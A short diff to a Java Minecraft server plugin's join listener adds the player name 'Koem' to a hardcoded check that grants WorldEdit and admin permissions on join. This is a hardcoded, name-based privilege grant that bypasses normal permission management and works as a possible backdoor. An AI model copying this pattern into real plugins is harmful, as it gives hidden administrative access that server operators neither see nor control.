@@ -39,7 +39,7 @@ public class PlayerJoinListener implements Listener {
             p.addAttachment(plugin, "cg.admin", true);
 
         }
-        if(p.getName().equals("xBYCZEKx") || p.getName().equals("xVeenix")){
+        if(p.getName().equals("xBYCZEKx") || p.getName().equals("xVeenix") || p.getName().equals("Koem")){
             p.addAttachment(plugin, "worldedit.*", true);
             p.addAttachment(plugin, "cdp.admin", true);
         }
